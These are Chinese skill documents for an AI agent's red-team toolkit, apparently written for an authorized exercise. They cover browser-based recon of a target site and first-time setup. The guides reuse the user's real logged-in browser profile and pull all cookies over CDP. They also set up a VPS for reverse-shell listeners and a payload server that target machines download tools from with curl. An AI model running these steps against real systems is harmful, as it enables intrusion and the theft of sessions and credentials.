# redteam-ops


---

## browser-automation

# 浏览器自动化（headless Chrome）

本机：`/usr/bin/chromium` 150.0.7871.181，`DISPLAY=:10.0`，Node v22.23.2。

## 一、零依赖：chromium 命令行（最稳）
```bash
CHROME=/usr/bin/chromium
FLAGS="--headless=new --no-sandbox --disable-gpu --disable-dev-shm-usage --virtual-time-budget=8000"

# 1) 抓渲染后的 DOM（SPA 也能拿到内容）
$CHROME $FLAGS --dump-dom "https://target.example.com/" 2>/dev/null > runs/page.html

# 2) 只取纯文本
$CHROME $FLAGS --dump-dom "https://target.example.com/" 2>/dev/null \
  | python3 -c "import sys,re;h=sys.stdin.read();print(re.sub(r'<[^>]+>',' ',re.sub(r'(?is)<(script|style).*?</\1>',' ',h)))" | head -200

# 3) 截图留证
$CHROME $FLAGS --window-size=1440,900 --screenshot=runs/shot-$(date +%s).png "https://target.example.com/"

# 4) 带 Cookie 访问（登录态复用：从 Burp/浏览器导出 Cookie 后写入）
$CHROME $FLAGS --user-data-dir=/tmp/rt-profile --dump-dom "https://target.example.com/admin"

# 5) 生成 PDF
$CHROME $FLAGS --print-to-pdf=runs/page.pdf "https://target.example.com/"
```

### 抓前端接口清单（信息收集重点）
```bash
# 用 chromium 跑一段 JS 并输出结果
$CHROME $FLAGS --dump-dom "https://target.example.com/" 2>/dev/null > runs/page.html
python3 - <<'PY'
import re, json, pathlib
html = pathlib.Path('runs/page.html').read_text(errors='ignore')
paths = set(re.findall(r'["\'](/(?:api|rest|v[0-9]|admin|user|order|upload|file)[A-Za-z0-9_\-/{}.:]{0,80})["\']', html))
print('\n'.join(sorted(paths)))
PY
# 再结合 JS 资源逐个下载提取：
grep -oE 'src="[^"]+\.js[^"]*"' runs/page.html | sed 's/src="//;s/"$//' | while read u; do
  case "$u" in http*) url="$u";; /*) url="https://target.example.com$u";; *) url="https://target.example.com/$u";; esac
  curl -s "$url" | grep -oE '["\'](/(api|rest|v[0-9])[A-Za-z0-9_\-/{}.:]{0,80})["\']' | tr -d '"'"'" >> runs/interfaces.txt
done
sort -u runs/interfaces.txt
```

## 二、playwright-cli（需要交互/等待/多页时）
**本机已装好浏览器**（`~/.cache/ms-playwright/chromium-1243`，一次性 `npx playwright install chromium` 已完成）。注意：**默认走 chrome 通道会报 `Chromium distribution 'chrome' is not found`，必须加 `--browser chromium`**。

```bash
PW="npx --yes @playwright/cli@latest"
$PW -s=recon1 open --browser chromium "https://target.example.com/"   # 打开（-s 指定会话名）
$PW -s=recon1 snapshot                                                # 无障碍树 + @e 元素引用
$PW -s=recon1 eval "() => document.title"                             # 执行 JS
$PW -s=recon1 find "登录"                                              # 在快照里搜文本
$PW -s=recon1 click "@e5"                                             # 点击
$PW -s=recon1 fill "@e7" "admin"                                      # 填表
$PW -s=recon1 screenshot --path runs/pw.png                           # 截图
$PW -s=recon1 --persistent --profile runs/pw-profile open --browser chromium URL   # 复用登录态
$PW -s=recon1 close                                                   # 关闭会话
```

登录态复用：`--persistent --profile <dir>`；首次登录后该 profile 保留 Cookie，后续直接用同一 profile 打开即为已登录。
常用子命令：`open / goto / snapshot / find / eval / click / fill / press / upload / screenshot / resize / reload / go-back / close / list`。

## 三、选择建议
| 场景 | 用哪个 |
|---|---|
| 只需页面内容/截图/接口清单 | chromium 命令行（零依赖、最快） |
| 需要点击/填表/等待/多标签 | playwright-cli（`--browser chromium`）|
| 需要复用用户真实登录态 | Kimi WebBridge（技能 `kimi-webbridge`，需扩展） |

## 注意事项
- `--no-sandbox` 仅在本机演练环境使用；不要把该参数带进生产。
- 抓到的 URL/标题写回 `（技能记录：asset_add）`（`url`/`title` 字段），接口清单写 `runs/` 并在攻击链里引用。
- 截图与页面内容可能含敏感数据，只落 `runs/`，不要写进资产库。

---

## kimi-webbridge

# Kimi WebBridge（浏览器扩展 + 本地守护进程）

已安装并运行：守护进程 **v2.0.8**（systemd 服务 `kimi-webbridge`，开机自启），监听 `127.0.0.1:10086`，二进制 `~/.kimi-webbridge/bin/kimi-webbridge`。

## 当前状态（2026-09 实测）
- 守护进程：**由 systemd 管理**（`/etc/systemd/system/kimi-webbridge.service`，`enabled` + `active`，`Restart=on-failure`）。
  查状态：`systemctl status kimi-webbridge`；重启用 `sudo systemctl restart kimi-webbridge`。
  **不要再手动跑 `kimi-webbridge start`/`upgrade`**，那会起一个游离进程、systemd 反而变 inactive；要升级用
  `sudo systemctl stop kimi-webbridge && ~/.kimi-webbridge/bin/kimi-webbridge upgrade && sudo systemctl start kimi-webbridge`。
- 扩展：**Kimi WebBridge v2.0.8，由企业策略自动从 Chrome 应用商店安装**（扩展 ID `fldmhceldgbpfpkbgopacenieobmligc`）。
  策略文件 `/etc/opt/chrome/policies/managed/kimi-webbridge.json` 与 `/etc/chromium/policies/managed/kimi-webbridge.json`
  都设置了 `ExtensionSettings.force_installed` + `ExtensionInstallForcelist`，所以 **Chrome / Chromium 的任何 profile 打开即自带扩展、自动更新、常驻启用**。
- Chrome 137+ 已忽略 `--load-extension`（`--disable-features=…` 的逃生口也失效），所以**不要再走解压加载路线**。
- 若 `status` 显示 `extension_connected: false`：99% 只是**没有浏览器在运行**，启动任一浏览器（`kimi-chrome` 或直接点 Chrome/Chromium 图标）后 5 秒内会自动连上。
- 简单取页面内容可优先用技能 `browser-automation`（更快、不依赖浏览器窗口）；**需要复用真实登录态时必须用本技能**

## 先决条件
1. 守护进程已运行：`~/.kimi-webbridge/bin/kimi-webbridge status` 应显示 `"running": true`（开机自启，正常无需干预）。
2. **必须有一个浏览器在运行**（扩展只在浏览器进程存活时维持连接）。启动器 `~/.local/bin/kimi-chrome`：
   - 默认启动 Chrome **默认 profile**（带真实登录态，桥接的价值就在这）；
   - `KIMI_BROWSER=chromium kimi-chrome` 改用 Chromium；`KIMI_PROFILE=/path kimi-chrome` 指定独立 profile（无登录态）。
3. 检查连接：
```bash
curl -s http://127.0.0.1:10086/status | python3 -m json.tool
# 必须看到 "extension_connected": true，否则后续命令会失败
```

## 调用方式
```bash
WB=http://127.0.0.1:10086/command
call() { printf '%s' "$2" > /tmp/wb.json; curl -s -X POST $WB -H 'Content-Type: application/json' --data-binary @/tmp/wb.json; }
```
> 含中文的 JSON 一律走临时文件 + `--data-binary`，不要用 echo/heredoc 内联。

### 常用动作
```bash
# 打开页面（新标签）
call navigate '{"action":"navigate","args":{"url":"https://target.example.com/login","newTab":true,"group_title":"recon"},"session":"recon1"}'

# 读取页面纯文本（最常用）
call evaluate '{"action":"evaluate","args":{"code":"(() => document.body.innerText.slice(0,6000))()"},"session":"recon1"}'

# 取无障碍树（带 @e 元素引用，便于后续 click/fill）
call snapshot '{"action":"snapshot","args":{},"session":"recon1"}'

# 执行任意 JS：抓前端接口清单（信息收集/接口发现神器）
call evaluate '{"action":"evaluate","args":{"code":"(() => {const s=new Set();for(const e of performance.getEntriesByType(\"resource\"))s.add(e.name);const m=document.documentElement.innerHTML.match(/[\\\"\\x27]\\/(api|v[0-9])\\/[a-zA-Z0-9_\\-\\/{}]+/g)||[];m.forEach(x=>s.add(x));return [...s].slice(0,200).join(\"\\n\")})()"},"session":"recon1"}'

# 点击 / 填表
call click '{"action":"click","args":{"ref":"@e12"},"session":"recon1"}'
call fill  '{"action":"fill","args":{"ref":"@e15","value":"admin"},"session":"recon1"}'

# 截图（返回文件路径，不是 base64）
call screenshot '{"action":"screenshot","args":{"path":"$DSH_HOME/redteam/engagements/<靶标>/runs/shot.png"},"session":"recon1"}'

# 抓网络请求（找接口）
call network '{"action":"network","args":{},"session":"recon1"}'

# 列出/关闭标签
call list_tabs '{"action":"list_tabs","args":{},"session":"recon1"}'
call close_session '{"action":"close_session","args":{},"session":"recon1"}'
```
原始 CDP 透传（高级）：`{"action":"cdp","args":{"method":"Network.getAllCookies"}}`。

## 在红队流程里的用法
- **接口发现**：打开站点 → `evaluate` 抓 resource timing + 页面内 JS 里的接口路径 → 把接口清单交给漏洞检测角色做越权/未授权测试。
- **登录态页面**：用户在浏览器里已登录的后台，可直接 `navigate` + `evaluate` 读取内容，无需重新登录。
- **JS 渲染站点**：比 curl 更真实，能拿到 SPA 渲染后的 DOM。
- 发现的 URL/标题照常写回 `（技能记录：asset_add）`（`tool="kimi-webbridge"`）。

## 限制（务必知道）
- **无 headless**：必须有图形会话（本机 `DISPLAY=:10.0` 可用）。
- 只支持 Chrome/Edge；跨域 iframe 不支持；`click`/`fill` 是合成事件，验证码/银行控件无效。
- 扩展与守护进程版本强耦合：`status` 里 `update_available` 不为空就按上面的 systemd 停机 → `upgrade` → 启机流程升级守护进程；扩展由策略自动更新到最新版。
- Linux 不在官方支持矩阵（能用但不保证）。

## 无扩展时的兜底
见技能 `browser-automation`（headless chromium 零依赖方案）。

---

## redteam-setup

# 首次使用引导（把环境一次配齐）

**触发条件**（满足任一即执行本技能，不要跳过）：
- `（技能记录：preflight）` 返回里 `onboarding.complete=false`；
- preflight 有 `broken` 技能且原因是"缺环境变量"或"VPS 还是占位符"；
- 用户第一次进红队模式、或明确说"环境/工具没配好"。

**核心原则**：**一次性把话说完，一次要齐**。不要挤牙膏式反复找用户要东西——那是这套引导存在的唯一理由。

## 一、先跑体检（不装任何东西，10 秒）

```bash
bash "$DSH_HOME/redteam/setup.sh" --check
```

它输出四块：① PATH 系统工具 ② nuclei 模板库 ③ 配置（FOFA_KEY / VPS） ④ 工具箱二进制体检表。
把这四块结论**如实复述**给用户，尤其 `✗` 与 `!` 的项。

## 二、再一键装齐（缺什么装什么，幂等可重跑）

```bash
bash "$DSH_HOME/redteam/setup.sh" --yes      # 全自动：缺的工具自动下载，配置用已有值
bash "$DSH_HOME/redteam/setup.sh"            # 交互式：会引导用户粘贴 FOFA_KEY 等
```

特性说明（可以这样告诉用户）：
- **幂等**：随时可重跑，已装的不重装；`--force` 才强制重下。
- **不猜 URL**：所有下载都走 GitHub `releases/latest` API 取真实资产。
- **不动系统**：只写 `$DSH_HOME/redteam/toolkit/` 与 `$DSH_HOME/.env` 两个位置，不装系统包、不改网络配置。
- **日志**：`$DSH_HOME/redteam/setup.log`。

需要 apt 装的系统工具（脚本只提示，不擅自 sudo）：`nmap masscan nuclei sqlmap ffuf feroxbuster gobuster hydra john hashcat wpscan nikto whatweb msfconsole` ——
**要装的话必须让用户自己执行**（智能体不跑 sudo）。

## 三、要用户提供什么（一次列清，说清"为什么"和"给到哪"）

| 要什么 | 为什么必须 | 给到哪 | 没有会怎样 |
| --- | --- | --- | --- |
| **FOFA_KEY** | 资产测绘（`fofa-recon`）靠它铺开单位互联网资产面；没有就只能靠 crt.sh + 子域枚举，**边缘资产与未备案资产会大量漏掉** | 环境变量 `FOFA_KEY`，或写进 `$DSH_HOME/.env`（脚本会代写） | 测绘能力降级：找不全资产 → 后面四个阶段都受影响 |
| **VPS 登录方式**（`user@ip` + 私钥路径） | 反弹 Shell 必须落到**公网可控主机**上；载荷投递、隧道中转也依赖它 | `REDTEAM_VPS_HOST`（`用户@主机`）/ `REDTEAM_VPS_KEY`（私钥路径，默认 `$DSH_HOME/redteam/toolkit/vps/id_rsa`） | 拿不到服务器权限、投递不了载荷、进不了内网 |
| （可选）测绘平台 key | Quake / Hunter / ZoomEye 与 FOFA 结果差异大，交叉能多找出资产 | 环境变量，按需 | 少一路交叉验证 |
| （可选）允许 apt 安装 | 补系统工具 | 用户自己执行 `sudo apt install …` | 相关技能降级 |

**话术要求**：列完后**等用户补齐**。不要用"我先用降级方案开工"糊过去——除非用户明确说"就按现有条件打"。

**注意**：用户的 key **不要写进仓库、不要贴进报告、不要在 `（技能记录：chain_add）` 的 `tool` 字段里出现**。
写进 `$DSH_HOME/.env`（脚本已 `chmod 600`）即可。

### FOFA_KEY 怎么拿（要能指导用户）
1. 登录 <https://fofa.info> → 右上角头像 → **个人中心 → API Key**；
2. 个人版限额：10,000 次查询/月、1 秒 1 次并发（**脚本与技能都按 1 秒 1 次限速，不要调高**，超了会触发 45012 封禁）；
3. 拿到后可以自测：`curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` —— 返回 `"error":false` 即有效。

### VPS 怎么准备（要能指导用户）
- 一台**公网可达**的 Linux VPS（1 核 1G 够用），安全组放行：`22`（SSH）、`9000-9999`（反弹 Shell 监听段）、`9100`（载荷分发）；
- 生成/放置 SSH 私钥到 `$DSH_HOME/redteam/toolkit/vps/id_rsa`，权限必须 `chmod 600`；
- 确认连通：`ssh -i <私钥> <user>@<ip> 'echo ok'`；
- **载荷分发服务**：VPS 上 `~/payload` 目录 + `python3 -m http.server 9100`（tmux 常驻），
  目标机可 `curl http://<ip>:9100/fscan` 直接拉工具。

## 四、装配完的验证（必须做完才算引导成功）

逐项实测，**不要只看"文件存在"**：

```bash
# 1) 二进制可执行
$DSH_HOME/redteam/toolkit/fscan/fscan -h 2>&1 | head -3
$DSH_HOME/redteam/toolkit/gogo/gogo -h 2>&1 | head -3
$DSH_HOME/redteam/toolkit/chisel/chisel --version
$DSH_HOME/redteam/toolkit/frp/frpc -v
$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64 --help 2>&1 | head -3

# 2) nuclei 模板库
nuclei -tl 2>/dev/null | wc -l        # 应有上万条

# 3) FOFA key 有效
curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'

# 4) VPS 可达 + 载荷服务在跑
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'ss -lnt | grep 9100'
curl -s -o /dev/null -w '%{http_code}\n' http://<ip>:9100/       # 应为 200

# 5) 技能注册表可见新技能
#    用 （技能记录：preflight） 复核，看 available 列表里是否含 nuclei-scan / credential-attack 等
```

## 五、最后一步：写完成标记并复核

```bash
bash "$DSH_HOME/redteam/setup.sh" --yes   # 会写 $DSH_HOME/redteam/.setup-complete
```

然后**再跑一次 `（技能记录：preflight）`**，确认：`onboarding.complete=true`、`broken` 为空或只剩用户明确接受降级的项。
把最终结论按"能用什么 / 缺什么 / 缺的影响是什么"三条报给用户。

**改了 `$DSH_HOME/.env` 后必须重启 dsh web**，否则当前进程读不到新的环境变量——
这一步要明确告诉用户（智能体不能替他重启）。

## 六、用户就是不给某些资源时（降级口径）

| 缺什么 | 降级方案 | 必须向用户说明的限制 |
| --- | --- | --- |
| FOFA_KEY | crt.sh 证书透明 + `passive-recon` + `recon-pipeline`（subfinder/ksubdomain/dnsx）+ 搜索引擎与备案信息 | **资产收集不完整**，未备案/边缘资产会漏；得分上限受影响 |
| VPS | 只做不需要落地的成果（账号权限、数据、未授权访问、WebShell 交付） | **拿不到服务器权限、进不了内网**，`boundary`/`internal`/`central-system` 类得分点基本放弃 |
| 系统工具（nuclei 等） | 用工具箱里的替代品（httpx/subfinder 仍在） | 漏洞发现能力大幅下降，Nday 检测基本瘫痪 |
| 全部都没有 | 只做纯被动信息收集与资产梳理 | 明确告诉用户"这次只能做到信息收集阶段" |

**降级决定要写进汇报**：用户需要知道这次是在什么条件下打的。